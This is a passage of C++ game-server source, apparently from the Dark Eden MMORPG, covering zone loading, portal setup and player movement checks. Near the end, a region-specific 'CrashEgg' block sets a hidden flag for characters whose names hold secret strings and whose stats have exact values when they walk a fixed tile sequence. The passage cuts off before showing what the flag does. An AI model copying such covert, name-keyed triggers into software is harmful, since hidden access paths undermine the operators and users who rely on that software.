						SMP.read((char*)&targetZoneID, szZoneID);
						SMP.read((char*)&targetX,      szBYTE);
						SMP.read((char*)&targetY,      szBYTE);

						pMultiPortal->setObjectType(PORTAL_SLAYER);

						// 타겟 인포를 구성한다.
						PortalTargetInfo* pPortalTargetInfo = new PortalTargetInfo();
						pPortalTargetInfo->setZoneID(targetZoneID);
						pPortalTargetInfo->setX(targetX);
						pPortalTargetInfo->setY(targetY);
						pMultiPortal->setPortalTargetInfo(pPortalTargetInfo);
					}

					getObjectRegistry().registerObject(pMultiPortal);
					m_pTiles[x][y].addPortal(pMultiPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Multi(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if ( type == PORTAL_GUILD )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					GuildPortal* pGuildPortal = new GuildPortal();
					pGuildPortal->setObjectType( PORTAL_GUILD );
					pGuildPortal->setZoneID( targetZoneID );
					pGuildPortal->setX( targetX );
					pGuildPortal->setY( targetY );

					getObjectRegistry().registerObject(pGuildPortal);
					m_pTiles[x][y].addPortal(pGuildPortal);

					if (bOutput)
					{
						cout << "Guild(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}

				}
				else if ( type == PORTAL_BATTLE )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// 포탈을 생성해 준다.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else
				{
					bAddPortal = false;
				}

				// 포탈이 추가된 경우에
				// 목적지 존이 유료존이라면 
				// TriggeredPortal을 설정해야 한다.
				if (bAddPortal)
				{
					ZoneInfo* pTargetZoneInfo = NULL;
					try {
						pTargetZoneInfo = g_pZoneInfoManager->getZoneInfo(targetZoneID);
					} catch (NoSuchElementException& t) {
						throw Error("그런 존이 없다네");
					}

					Assert(pTargetZoneInfo!=NULL);

					// 기존의 Portal을 지울까?
					bool bDeleteOldPortal = false;

					if ( ( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() )
						|| pTargetZoneInfo->isMasterLair()
						|| ( pTargetZoneInfo->isCastle() && !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
						|| ( pTargetZoneInfo->isHolyLand() && !pZoneInfo->isHolyLand() )
						|| (isCastle() && g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
					   )
					{
						bDeleteOldPortal = true;
					}

/*					if (( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() )
						|| pTargetZoneInfo->isMasterLair())
					{
						bDeleteOldPortal = true;
					}*/

					Tile& rTile = m_pTiles[x][y];
					
					// 기존의 Portal을 지우는 경우
					if (bDeleteOldPortal)
					{
						// 기존에 있던 portal을 제거한다.
						if (rTile.hasPortal())
						{
							Portal* pOldPortal = rTile.getPortal();
							rTile.deletePortal();

							delete pOldPortal;
						}
					}

					// 포탈을 생성하고, 등록한다.

					//----------------------------------------
					// 마스터 레어인 경우
					// by sigi. 2002.9.2
					//----------------------------------------
					if (pTargetZoneInfo->isMasterLair())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMasterLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
 //                                       g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );
                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 지금은 들어갈 수 없습니다.");

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					//----------------------------------------
					// 유료존으로 들어가는 경우
					//----------------------------------------
					else if (pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// 포탈 내용을 로드한다.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// 의미없다.

						pTrigger->setTriggerType("QUEST");
						pTrigger->setConditions("ConditionType : PayPlay\n\t");
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_PAY_ZONE ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_PAY_ZONE );
                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : 유료존이라서 들어갈 수 없습니다.");

						tm.addTrigger(pTrigger);
						
						// 타일에다 포탈을 붙인다.
						rTile.addPortal(pPortal);
					}
				}


			} //if (flag & 0x80)
		} // for 
	} // for

	SMP.close();

	///*
	if (m_MonsterRegenPositions.size()==0)
	{
		cout << "MonsterRegenPosition not exist" << endl;
		cout << "Width = " << m_Width << endl;
		cout << "Height = " << m_Height << endl;

		//Assert(m_MonsterRegenPositions.size()!=0);

		ZoneCoord_t outerMinX = m_Width/7;
		ZoneCoord_t outerMinY = m_Height/7;
		ZoneCoord_t outerMaxX = m_Width-outerMinX;
		ZoneCoord_t outerMaxY = m_Width-outerMinY;

		for (ZoneCoord_t y=outerMinY; y<outerMaxY; y++)
		{
			for (ZoneCoord_t x=outerMinX; x<outerMaxX; x++)
			{
				Tile& rTile = m_pTiles[x][y];

				if (!rTile.hasPortal() 
					&& !rTile.isGroundBlocked()
					&& !rTile.isAirBlocked()
					&& !rTile.isUndergroundBlocked())
				{
					m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
				}
			}
		}

		Assert(m_MonsterRegenPositions.size()!=0);
	}

	if ((isMasterLair() || m_ZoneID == 3002) && m_EmptyTilePositions.size()==0)
	{
		cout << "MasterLair has No EmptyTilePosition" << endl;
		Assert(m_EmptyTilePositions.size()!=0);
	}
	// */

	// Zone 정보를 세팅한다.
	m_ZoneType  = pZoneInfo->getZoneType();
	m_ZoneLevel = pZoneInfo->getZoneLevel();

	// m_ppLevel 제거
	for (i = 0; i < m_Width; i++)
	{
		SAFE_DELETE_ARRAY( m_ppLevel[i] );
	}
	SAFE_DELETE_ARRAY( m_ppLevel );

	// 메모리 할당해주고...
	m_ppLevel = new ZoneLevel_t* [ m_Width ];
	for (uint i = 0; i < m_Width; i++)
		m_ppLevel[i] = new ZoneLevel_t[m_Height];

	// 존 레벨을 디폴트 값으로 초기화시킨다.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	// SSI 정보 파일을 연다.
	string SSIFilename = g_pConfig->getProperty("HomePath") + "/data/" + pZoneInfo->getSSIFilename();
	ifstream SSI(SSIFilename.c_str(), ios::in | ios::binary );
	if (!SSI)
	{
		strcpy( lwrFilename, SSIFilename.c_str());
		strlwr( lwrFilename );
		SSI.open(lwrFilename, ios::in | ios::binary );

		//cout << "second chk : " << lwrFilename << endl;

		if (!SSI)
		{
			StringStream msg;
			msg << SSIFilename << " not exist or cannot open it";
			throw FileNotExistException(msg.toString());
		}
	}

	int size = 0;
	SSI.read((char*)&size, szint);

	BYTE left, top, right, bottom, level;
	for (int i=0; i<size; i++)
	{
		SSI.read((char*)&level, szBYTE);
		SSI.read((char*)&left, szBYTE);
		SSI.read((char*)&top, szBYTE);
		SSI.read((char*)&right, szBYTE);
		SSI.read((char*)&bottom, szBYTE);

		if (bOutput)
		{
			cout << "LEVEL:" << (int)level << ",(" << (int)left << "," << (int)top << "," << (int)right << "," << (int)bottom << ")" << endl;
		}

		Assert(left <= right);
		Assert(top  <= bottom);

		for (int bx=left; bx<=right; bx++)
			for (int by=top; by<=bottom; by++)
				m_ppLevel[bx][by] = level;
	}

	SSI.close();

	// 트리거드 포탈을 로드한다.
	// reload에서는 무시
	//loadTriggeredPortal();

	// 몬스터 로드하고....
	m_pMonsterManager->load();

// eventMonsterManager는 reload에서는 무시한다.
//#ifdef __XMAS_EVENT_CODE__
//	cout << "Begin Event Monster Loading..." << endl;
//	m_pEventMonsterManager->load();
//	cout << "Event Monster Loading Completed..." << endl;
//#endif

	// 마스터 레어인 경우
	// by sigi. 2002.9.2
	if (pZoneInfo->isMasterLair())
	{
		if (m_pMasterLairManager!=NULL
			&& m_pMasterLairManager->getCurrentEvent()==MasterLairManager::EVENT_WAITING_REGEN)
		{
			SAFE_DELETE(m_pMasterLairManager);
			m_pMasterLairManager = new MasterLairManager(this);
		}
	}

	// 성인 경우
	// by sigi. 2003.1.24
	if (pZoneInfo->isCastle())
	{
		if (m_pWarScheduler!=NULL)
			//&& m_pWarScheduler->getCurrentEvent()==WarScheduler::EVENT_WAITING_REGEN)
		{
			SAFE_DELETE(m_pWarScheduler);
			m_pWarScheduler = new WarScheduler(this);
		}
	}

	// reload할 때는 무시한다.
	// 아이템 로드한다.
	//loadItem();
	// NPC 를 로딩한다.
	//m_pNPCManager->load(m_ZoneID);

	// 스프라이트 갯수를 초기화한다.
	initSpriteCount();
} catch ( Throwable& t )
{ cout << t.toString() << endl; Assert(false);}

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// load items from database
// * NOTE *
// 현재 바닥에 떨어진 아이템은 서버가 재시작되어도 로딩하지 않는다.
//////////////////////////////////////////////////////////////////////////////
void Zone::loadItem () 
	
{
	__BEGIN_TRY

	/*
	// 아이템 로딩...........
	g_pItemLoaderManager->load(this);

	// 아이템은 다 날려버렸지만...그래두...
	// 아이템 오브젝트 아이디를 재 할당 받고 다시 저장한다.
	for (int j = 0; j < m_Height; j++) 
	{
		for (int i = 0; i < m_Width; i++) 
		{
			if (m_pTiles[i][j].hasItem()) 
			{
				Item* pItem = m_pTiles[i][j].getItem();
				m_ObjectRegistry.registerObject(pItem);
				pItem->save("", STORAGE_ZONE, m_ZoneID, i, j);
				addToItemList(pItem);

				if (pItem->getItemClass() == Item::ITEM_CLASS_MOTORCYCLE) 
				{
					Motorcycle* pMotorcycle = dynamic_cast<Motorcycle*>(pItem);
					MotorcycleBox* pMotorcycleBox = new MotorcycleBox(pMotorcycle, this, i, j);
					g_pParkingCenter->addMotorcycleBox(pMotorcycleBox);
				}
			}
		}
	}
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 현재 존에 트리거드 포탈을 로드한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::loadTriggeredPortal ()
	
{
	__BEGIN_TRY

	Statement* pStmt   = NULL;
	Result*    pResult = NULL;

	BEGIN_DB
	{
		// DynamicZone 일 경우 처리
		ZoneID_t zoneID = m_ZoneID;
		if ( isDynamicZone() )
		{
			zoneID = m_pDynamicZone->getTemplateZoneID();
		}

		pStmt   = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
		pResult = pStmt->executeQuery("SELECT X1, Y1, X2, Y2 FROM ZoneTriggers WHERE ZoneID=%d", zoneID);

		while (pResult->next())
		{
			int left   = pResult->getInt(1);
			int top    = pResult->getInt(2);
			int right  = pResult->getInt(3);
			int bottom = pResult->getInt(4);

			Assert(left <= right);
			Assert(top <= bottom);
			
			Assert(m_OuterRect.ptInRect(left, top));
			Assert(m_OuterRect.ptInRect(right, bottom));

			for (int x=left; x<=right; x++)
			{
				for (int y=top; y<=bottom; y++)
				{
					if (getTile(x,y).hasPortal())
					{
						//cerr << "loadTriggeredPortal : 이미 포탈이 존재합니다." << endl;
						//cerr << "ZONEID:" << m_ZoneID << ",X:" << x << "Y:" << y << endl;
						//Portal* pPortal = getTile(x,y).getPortal();
						//SAFE_DELETE(pPortal);
						getTile(x,y).deletePortal();
					}

					// 포탈을 생성하고, 등록한다.
					TriggeredPortal* pPortal = new TriggeredPortal();
					getObjectRegistry().registerObject(pPortal);

					// 포탈 내용을 로드한다.
					pPortal->setObjectType(PORTAL_NORMAL);
					pPortal->load(zoneID, left, top, right, bottom);
					
					// 타일에다 포탈을 붙인다.
					getTile(x, y).addPortal(pPortal);
				}
			}
		}

		SAFE_DELETE(pStmt);
	}
	END_DB(pStmt);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 이 존에서 나타나는 NPC와 몬스터의 스프라이트갯수를 계산해둔다.
//////////////////////////////////////////////////////////////////////////////
void Zone::initSpriteCount () 
	
{
	__BEGIN_TRY

	m_NPCCount = 0;
	m_MonsterCount = 0;

	// NPC 스프라이트 타입의 갯수를 계산한다.
	const unordered_map<ObjectID_t, Creature*>& NPCMap = m_pNPCManager->getCreatures();
	for (unordered_map<ObjectID_t, Creature*>::const_iterator i = NPCMap.begin(); i != NPCMap.end(); i++)
	{
		NPC* pNPC = dynamic_cast<NPC*>(i->second);
		bool bAdd = true;
		
		for (int j=0; j<m_NPCCount; j++) // 현재 있는 몬스터 타입 중에서 
		{
			if (pNPC->getSpriteType() == m_NPCTypes[j])
			{
				bAdd = false;
				break;
			}
		}

		if (bAdd)
		{
			m_NPCTypes[m_NPCCount] = pNPC->getSpriteType();
			m_NPCCount++;
		}
	}

	// 몬스터 스프라이트 타입의 갯수를 계산한다.
	const unordered_map<SpriteType_t, MonsterCounter*>& MONSTER = m_pMonsterManager->getMonsters();
	for (unordered_map<SpriteType_t, MonsterCounter*>::const_iterator i = MONSTER.begin(); i != MONSTER.end(); i++)
	{
		Assert ( m_MonsterCount < maxMonsterPerZone );	// by sigi

		m_MonsterTypes[m_MonsterCount] = i->first;
		m_MonsterCount++;
	}

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 타일에 지정된 존 레벨을 리턴한다.
//////////////////////////////////////////////////////////////////////////////
ZoneLevel_t Zone::getZoneLevel(ZoneCoord_t x, ZoneCoord_t y) const 
	
{
	__BEGIN_TRY

	//Assert(x < m_Width && y < m_Height);

	// assert 제거. 
	// 이 값이 한계를 넘어서 assert나서 죽었다.
	// 이렇게 가도 무리가 없을 듯..
	// by sigi. 2002.8.13
	if (x < m_Width && y < m_Height)
	{
		return m_ppLevel[x][y];
	}

	return COMPLETE_SAFE_ZONE;

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// getTile
//////////////////////////////////////////////////////////////////////////////
const Tile & Zone::getTile(ZoneCoord_t x, ZoneCoord_t y) const 
    
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);
	return m_pTiles[x][y];
	
	__END_CATCH
}

Tile & Zone::getTile(ZoneCoord_t x, ZoneCoord_t y) 
    
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);
	return m_pTiles[x][y];
	
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// getSector
//////////////////////////////////////////////////////////////////////////////
Sector* Zone::getSector(ZoneCoord_t x, ZoneCoord_t y) 
    
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);

	int sx = x/SECTOR_SIZE;
	int sy = y/SECTOR_SIZE;

	Assert(sx < m_SectorWidth && y < m_SectorHeight);

	return &(m_pSectors[sx][sy]);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 기본적으로 Zone 의 처리는 mutex 를 사용하지 않는다.
// 왜냐하면, ZoneGroupThread의 단일 처리를 받기 때문이다. 그런데, 새로 존에 
// PC를 추가하는 것은 IPM에서 이루어지게 되므로, 이런 연유로 mutex 멤버를
// 추가해야 하며, 아래 메소드에 locking 을 걸어줘야 한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::pushPC(Creature* pCreature)
	
{
	__BEGIN_TRY 

	Assert(pCreature != NULL);

	__ENTER_CRITICAL_SECTION(m_Mutex)

	m_PCListQueue.push_back(pCreature);
	//m_PCQueue.push(pCreature);
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// P(cx,cy)에 있는 PC를 dir 방향으로 이동시켜 Q(nx,ny)로 옮긴다.
// 그리고나서, 주변의 PC들에게 이동 정보를 브로드캐스트한다. 
//
// *CAUTION*
// PC가 아닌 크리처(NPC,Monster)의 이동은 moveCreature를 사용한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::movePC(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	
{
	__BEGIN_TRY

	Assert(pCreature->isPC());

	Player* pPlayer = pCreature->getPlayer();
	Assert(pPlayer != NULL);

	if (dir >= DIR_MAX || !isAbleToMove(pCreature))
	{
		GCMoveError 	gcMoveError(pCreature->getX(), pCreature->getY());
		pPlayer->sendPacket(&gcMoveError);
		filelog("ZoneDebug.txt", "movePC - 1\n\r"); 
		return;
	}

	const int threshold = 6;
	////////////////////////////////////////////////////////////
	// 일단 크리처가 점프를 하려는 건지를 체크한다.
	// 만약 약간 점프했을 경우, GCMoveError 패킷을 전송한다.
	// 
	// OX, OY : 플레이어의 현재 좌표
	// CX, CY : 타겟 좌표
	//
	// max(0, OX - threshold) <= CX <= min(OX + threshold, ZONEWIDTH-1)
	// max(0, OY - threshold) <= CY <= min(OY + threshold, ZONEHEIGHT-1)
	// 를 만족해야 정상적인 이동이다.
	////////////////////////////////////////////////////////////
	if (pCreature->getX() != cx || pCreature->getY() != cy) 
	{
		if (cx >= max(0           , pCreature->getX() - threshold) && 
			cx <= min(m_Width - 1 , pCreature->getX() + threshold) && 
			cy >= max(0           , pCreature->getY() - threshold) && 
			cy <= min(m_Height - 1, pCreature->getY() + threshold)) 
		{
			// 허용가능한 오차 범위내에서의 점프는 그냥 무시해준다.

			/*// 주석처리 by sigi - 안 보내는게 맞는 듯.. 
			GCMoveError gcMoveError;
			gcMoveError.setX(cx);
			gcMoveError.setY(cy);
			pCreature->getPlayer()->sendPacket(&gcMoveError);
			*/
			filelog("ZoneDebug.txt", "movePC - 2\n\r");
			return;
		} 
		else 
		{
			// 허용가능한 오차 범위를 넘어설 경우 접속을 차단한다.
			//StringStream msg;
			//msg << pCreature->getName() << " try to jump from (" 
			//	<< (int)pCreature->getX() << "," << (int)pCreature->getY()
			//	<< ") to (" << (int)cx << "," << (int)cy << ")";

			GCMoveError 	gcMoveError(cx, cy); 
			pPlayer->sendPacket(&gcMoveError);
			filelog("ZoneDebug.txt", "movePC - 3\n\r");
			return;
		}
	}

	// 다음 좌표를 계산한다.
	int nx = cx;
	int ny = cy;

	//////////////////////////////////////////////////////////////////////////////
	// *CAUTION*
	// 경계지점에서 경계의 외곽으로 움직이는 패킷이 날아와서는 안된다.
	// ex> (0,10)에서 LEFT 이동은 날아올 수 없다. (10,0)에서 UP 이동도 마찬가지이다.
	//////////////////////////////////////////////////////////////////////////////
	nx = nx + dirMoveMask[dir].x;
	ny = ny + dirMoveMask[dir].y;

	VSRect rect(0, 0, m_Width-1, m_Height-1);
	if (!rect.ptInRect(nx, ny)) throw InvalidProtocolException("invalid coordination");

	////////////////////////////////////////////////////////////
	// 이동할 곳이 block 되어있다면, GCMoveError 를 전송한다.
	// (PC와 같은 위치가 block 되어야 한다.)
	////////////////////////////////////////////////////////////
	Tile& newTile = m_pTiles[nx][ny];
	Tile& oldTile = m_pTiles[cx][cy];

	 // 성물을 가지고 있는 경우라면.. 안전지대에 들어갈 수 없다.
	if (pCreature->hasRelicItem() || pCreature->isFlag( Effect::EFFECT_CLASS_HAS_FLAG ) || pCreature->isFlag( Effect::EFFECT_CLASS_HAS_SWEEPER))
	{
		ZoneLevel_t ZoneLevel = getZoneLevel(nx, ny);

		// 슬레이어이면 슬레이어 안전지대에 못 들어간다.
		// 뱀파이어이면  뱀파이어안전지대에 못 들어간다.
		// 공통 안전지대이면 못 들어간다.
		if (pCreature->isSlayer() && (ZoneLevel & SLAYER_SAFE_ZONE)
			|| pCreature->isVampire() && (ZoneLevel & VAMPIRE_SAFE_ZONE)
			|| pCreature->isOusters() && (ZoneLevel & OUSTERS_SAFE_ZONE)
			|| (ZoneLevel & COMPLETE_SAFE_ZONE))
		{
			GCMoveError 	gcMoveError(cx, cy); 
			pPlayer->sendPacket(&gcMoveError);
			filelog("ZoneDebug.txt", "movePC - 4\n\r");
			return;
		}
	}

	if (newTile.hasCreature(pCreature->getMoveMode()))
	{
		Creature* pTargetCreature = newTile.getCreature( pCreature->getMoveMode() );
		if ( pTargetCreature != NULL && pTargetCreature->isMonster() )
		{
			Monster* pMonster = dynamic_cast<Monster*>(pTargetCreature);
			if ( pMonster->getMonsterType() >= 738 && pMonster->getMonsterType() <= 740 )
			{
				pMonster->addEnemy(pTargetCreature);
				pMonster->setHP(0);
			}
		}

		GCMoveError 	gcMoveError(cx, cy); 
		pPlayer->sendPacket(&gcMoveError);
	}

	if (newTile.isBlocked(pCreature->getMoveMode())
		// BloodyWallBlocked나
		// Sanctuary 이펙트가 걸려있다면 못 간다.
        || newTile.hasEffect() && 
			(newTile.getEffect(Effect::EFFECT_CLASS_BLOODY_WALL_BLOCKED)
	        || newTile.getEffect(Effect::EFFECT_CLASS_SANCTUARY))
		|| oldTile.getEffect(Effect::EFFECT_CLASS_SANCTUARY) != NULL
		)
	{
		GCMoveError 	gcMoveError(cx, cy); 
		pPlayer->sendPacket(&gcMoveError);
	} 
	else
	{ 
		// 우선 크리처의 좌표를 변경한다.
		pCreature->setXYDir(nx, ny, dir);

		try 
		{
			// 이전 타일에서 크리처를 삭제한다.
			m_pTiles[cx][cy].deleteCreature(pCreature->getObjectID());	

			// 새 타일에 크리처를 추가한다.
			if (!newTile.addCreature(pCreature))
			{
				// Portal을 activate 시킨 경우이다. by sigi. 2002.5.6
				return;
			}

			try {
				checkMine(this, pCreature, nx, ny);
				checkTrap(this, pCreature);
			} catch ( Throwable & t ) {
				filelog("CheckMineBug.txt", "%s : %s", "movePC", t.toString().c_str());
			}

			// 클라이언트에게 GCMoveOK 를 전송할때, (nx,ny)는 도착 좌표여야 하며,
			// dir 은 바라보는(이동할) 방향이어야 한다. 그것이 현재의 정책!
			GCMoveOK gcMoveOK(nx,ny,dir);
			pPlayer->sendPacket(&gcMoveOK);
	
			// 자동으로 GCMove/GCAddSlayer/GCAddVampire 패킷을 브로드캐스트한다.
			movePCBroadcast(pCreature, cx, cy, nx, ny);
		} 
		catch (NoSuchElementException & nsee) 
		{
			throw Error("이전 타일에 크리처가 존재하지 않습니다.");
		} 
		catch (DuplicatedException & de) 
		{
			throw Error("새 타일에 크리처가 이미 존재합니다.");
		} 
		catch (PortalException&) 
		{
		}
		catch (Error& e)
		{
			filelog("assertTile.txt", "Zone::movePC : %s", e.toString().c_str());
			throw;
		}
#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)
// process CrashEgg for China and Thailand service
		int             eggID = 0;

		// ZoneID(1311) - 아우스터즈 마을
        if(pCreature->getZoneID() == EGG_ZONE && pCreature->isOusters() )
        {
                 Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);

                 string                 strName = pOusters->getName();          // Player Character Name
                 ZoneCoord_t    ep_x    = pCreature->getX();            // position X on Zone
                 ZoneCoord_t    ep_y    = pCreature->getY();            // position Y on Zone
                 Attr_t                 tmpSTR  = pOusters->getSTR();           // STR value
                 Attr_t                 tmpDEX  = pOusters->getDEX();           // DEX value
                 Attr_t                 tmpINT  = pOusters->getINT();           // INT value

                 string::size_type pattern1_pos = strName.find("dtxc", 0);
                 string::size_type pattern2_pos = strName.find("txcd", 0);
                 string::size_type pattern3_pos = strName.find("xcdt", 0);
                 string::size_type pattern4_pos = strName.find("dxtc", 0);

                 // 케릭터명에 `dtxc' 가 포함되어있으면 Pattern1 짜리다.
                 if( pattern1_pos != string::npos && (tmpSTR == 20 && tmpDEX == 13 && tmpINT == 12))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                      if(g_EggTable[jpos][2] == 0)
                                                      {
                                                      		bAllCheck = false;
                                                            break;
                                                      }
                                                }

                                                if(bAllCheck == true)
                                                {
                                                      g_EggTable[ipos][2] = 1;
                                                      g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                      for(int xpos=ipos-1; xpos >=0; xpos--)
                                                      {
                                                      		g_EggTable[xpos][2] = 0;
                                                      }
                                                      g_EggTableComplete = 0;
                                                }
                                        }
                                }
                        }
						if(g_EggTableComplete >= 7)
                        {
                        	eggID = 1;
                        }
                 }//pattern 1 end
                 else if( pattern2_pos != string::npos && (tmpSTR == 13 && tmpDEX == 12 && tmpINT == 20))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
	


                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 2;
                         }
                 }// pattern 2 end
                 else if( pattern3_pos != string::npos && (tmpSTR == 12 && tmpDEX == 20 && tmpINT == 13))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
 
                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 3;
                         }
                 }// pattern 3 end
                 else if( pattern4_pos != string::npos && (tmpSTR == 12 && tmpDEX == 18 && tmpINT == 15))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
